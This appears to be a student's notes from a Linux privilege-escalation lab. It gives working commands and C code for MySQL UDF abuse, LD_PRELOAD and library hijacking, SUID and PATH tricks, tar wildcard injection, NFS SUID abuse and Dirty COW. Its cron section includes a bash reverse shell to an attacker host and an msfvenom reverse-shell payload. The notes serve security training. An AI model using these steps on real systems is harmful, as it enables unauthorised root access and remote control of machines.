# Linux PrivEsc

> Sujit Konapur, November 13th, 2020

----------------------------------------

## Service Exploits
+ MySQL service is running as root, use an exploit that leverages User Defined Functions (UDFs) to run system commands as root.
+ Downloaded `exploit/1518` from exploitdb.
+ Compiled using:
	- `gcc -g -c raptor_udf2.c -fPIC`
	- `gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc`
+ Connect to MySQL service using:
	- `mysql -u root`
+ Execute following commands in the MySQL shell to create a UDF `do_system`:
	- `use mysql;`
	- `create table foo(line blob);`
	- `insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));`
	- `select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';`
	- `create function do_system returns integer soname 'raptor_udf2.so';`
+ Use the function to copy /bin/bash ans set SUID:
	- `select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
+ Exit MySQL shell and run `/tmp/rootbash -p` to gain root.

## Weak File Permissions 
### Readable /etc/shadow
+ The contents of `/etc/shadow` file are readable.
+ Store the hash of root user to a file and crack using john and rockyou.

### Writable /etc/shadow
+ The `/etc/shadow` file is writable.
+ Generate a new password hash:
	`mkpasswd -m sha-512 newpasswordhere`
+ Edit `/etc/shadow` file and replace with new hash.
+ Switch to root and login using new password.

### Writable /etc/passwd
+ The `/etc/passwd` file is writable.
+ Generate a new password hash using:
	`openssl passwd newpasswordhere`
+ Edit the `passwd` file and replace the x with new password.
+ Switch to root user and enter new password to login.

## Sudo
### Shell Escape Sequences
+ Listed the programs which sudo allows user to run: `sudo -l`
+ Used GTFOBins to get root.

### Environment Variables
+ sudo can inherit certain environment variables from the user's environment.
+ Use `sudo -l` to find `LD_PRELOAD` and `LD_LIBRARY_PATH` being inherited by sudo.
+ `LD_PRELOAD` -> loads a shared object before any others when a program is run
+ `LD_LIBRARY_PATH` -> provides a list of directories where shared libraries are searched for first.
+ Create a shared object using following command:
	- `gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/preload.c` 
		```
		#include <stdio.h>
		#include <sys/types.h>
		#include <stdlib.h>

		void _init() {
			unsetenv("LD_PRELOAD");
			setresuid(0,0,0);
			system("/bin/bash -p");
		}
		```
+ Set `LD_PRELOAD` env variable to the full path of the new shared object and run any sudo permitted program:
	- `sudo LD_PRELOAD=/tmp/preload.so vim`
+ Spawns a root shell.
+ List shared libraries using:
	- `ldd /usr/sbin/apache2`
+ Create a shared object with the same name as one of the libraries:
	- `gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/library_path.c`
		```
		#include <stdio.h>
		#include <stdlib.h>

		static void hijack() __attribute__((constructor));

		void hijack() {
			unsetenv("LD_LIBRARY_PATH");
			setresuid(0,0,0);
			system("/bin/bash -p");
		}
		```
+ Run apache2 while setting `LD_LIBRARY_PATH` env variable:
	- `sudo LD_LIBRARY_PATH=/tmp apache2`

## Cron Jobs
### File Permissions
+ View the contents of system-wide crontab using `cat /etc/crontab`.
+ There are multiple scripts running as root.
+ Modify `overwrite.sh` with following payload to pop a reverse shell:
	```
	#!/bin/bash 
	bash -i >& /dev/tcp/KALI-IP/4444 0>&1
	```
+ Start a netcat listener on attacker machine and catch the reverse shell.

### PATH Environment Variable 
+ Notice that PATH first hits `/home/user`.
+ Create a file called overwrite.sh in user's home directory.
+ Add the following to it:
	```
	#!/bin/bash

	cp /bin/bash /tmp/rootbash
	chmod +xs /tmp/rootbash
	```
+ Make the script executable using chmod.
+ Wait for sometime and then execute `/tmp/rootbash -p` to get root access.

### Wildcards
+ There is another script run by cron job as root. 
+ The script runs a tar command with a wildcard in home directory.
+ Look up tar on GTFOBins.
+ Use msfvenom to craft and build payload:
	- `msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f elf -o shell.elf`
+ Transfer payload and make sure it has execute permissions.
+ Create following two files:
	- `touch /home/user/--checkpoint=1`
	- `touch /home/user/--checkpoint-action=exec=shell.elf`
+ The tar command will include them as valid options at runtime.
+ Setup netcap listener on attacker machine to capture root shell.

## SUID/SGID Executables
### Known Exploits
+ Find SUID binaries: `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -la {} \; 2>/dev/null`
+ Lists exim-4.84-3, use searchsploit to look for vulnerabilities.
+ Promising know vuln -> CVE-2016-1531
+ Run exploit on victim to gain root.

### Shared Object Injection
+ The binary `suid-so` is vulnerable to shared object injection.
+ Run the binary.
+ Run strace using `strace suid-so 2>&1 | grep -iE "open|access|no such file"`
+ The executable tries to load a library in home directory.
+ Create a `.config` directory.
+ Compile C code to spawn a shell:
	- `gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c`
		```
		#include <stdio.h>
		#include <stdlib.h>

		static void inject() __attribute__((constructor));

		void inject() {
			setuid(0);
			system("/bin/bash -p");
		}
		```
+ Execute the suid-so binary again to get a root shell.

### Environment Variables
+ The suid-env binary inherits the user's PATH, which can be exploited.
+ First execute the binary & run strings on it, it tries to start the apache2 webserver but does not use the full path for `/usr/sbin/service`.
+ Compile C code which spawns a shell:
	- `gcc -o service service.c`
		```
		int main() {
			setuid(0);
			system("/bin/bash -p");
		}
		```
+ Prepend the current directory to PATH: `PATH=.:$PATH`
+ Run suid-env to gain root.

### Abusing Shell Features (#1)
+ Ran strings on suid-env2 binary, it uses absolute path.
+ In Bash versions older than 4.2-048, it is possible to define shell functions with names that resemble file paths then export them.
+ Created a Bash function  with the name `/usr/sbin/service` and export it in a shell script as follows:
    ```
    function /usr/sbin/service { /bin/bash -p; }
    export -f /usr/sbin/service
    /usr/local/bin/suid-env2
    ```

### Abusing Shell Features (#2)
+ Bash uses environment variable PS4 to display extra prompt for debugging statements.
+ Run the suid-env2 executable with debugging enabled: `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2`
+ Run the rootbash binary to get root: `/tmp/rootbash -p`

## Password & Keys
### History Files
+ Always check hidden history files to look for passwords/hints.

### Config Files
+ Config files often contain passwords in plaintext.

### SSH Keys
+ Look for hidden SSH keys, and use it to gain root.

## NFS
+ Check the NFS share config using `cat /etc/exports`. 
+ As root on kali, create a mount using:
	- `mkdir /tmp/nfs`
	- `mount -o rw,vers=2 VIC_IP:/tmp /tmp/nfs`
+ Craft an exploit using `msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf`.
+ Set SUID: `chmod +xs /tmp/nfs/shell.elf`
+ Go back to victim as user and execute `/tmp/shell.elf` to get root.

## Kernel Exploits
+ Kernel exploits are unstable and must be used as a last resort.
+ Run the Linux Exploit Suggester.
+ Compile dirty cow on the target machine using `gcc -pthread c0w.c -o c0w`.
+ Once exploit completes, run `/usr/bin/passwd` to gain root.
